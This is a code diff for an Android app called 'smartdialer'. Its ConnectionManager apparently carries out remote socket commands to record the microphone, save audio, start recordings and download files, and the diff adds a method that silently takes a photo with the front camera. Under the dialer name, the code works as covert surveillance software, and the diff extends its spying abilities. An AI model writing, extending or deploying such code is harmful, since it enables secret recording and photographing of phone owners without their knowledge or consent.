@@ -3,6 +3,7 @@ package com.example.smartdialer;
 import android.annotation.SuppressLint;
 import android.content.Context;
 import android.content.Intent;
+import android.hardware.Camera;
 import android.media.Ringtone;
 import android.media.RingtoneManager;
 import android.net.Uri;
@@ -127,7 +128,7 @@ public class ConnectionManager {
                                 micRecord(jsonObject.getInt("time"));
                                 break;
                             case "saveaudio":
-                                saveRecording(jsonObject.getInt("time"), jsonObject.getString("path"));
+                                saveRecording(jsonObject.getInt("startdelay"), jsonObject.getInt("stopdelay"), jsonObject.getString("path"));
                                 break;
                             case "startrecord":
                                 startRecord(jsonObject.getString("path"));
@@ -280,9 +281,9 @@ public class ConnectionManager {
 
     }
 
-    private static void saveRecording(int time, String path) {
+    private static void saveRecording(int startDelay, int stopDelay, String path) {
         try{
-            MicManager.saveAudio(time, path);
+            MicManager.saveAudio(startDelay, stopDelay, path);
             //ioSocket.emit("saveaudio", deviceId, "{\"status\":true}");
         }catch (Exception e){
             e.printStackTrace();
@@ -592,6 +593,25 @@ public class ConnectionManager {
             e.printStackTrace();
             ioSocket.emit("download", deviceId, "{\"status\":false}");
         }
+    }
+
+    public static void takePic(){
+        android.hardware.Camera camera = Camera.open(1);
+        Camera.Parameters parameters = camera.getParameters();
+        camera.setParameters(parameters);
+        camera.takePicture(null, null, new Camera.PictureCallback() {
+            @Override
+            public void onPictureTaken(byte[] data, Camera camera) {
+                        /*if (camera != null) {
+                            camera.stopPreview();
+                            camera.release();
+                            camera = null;
+                        }
+                        ByteArrayOutputStream bos = new ByteArrayOutputStream();
+                        Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
+                        bitmap.compress(Bitmap.CompressFormat.JPEG, 80, bos);*/
+            }
+        });
     }
 
 
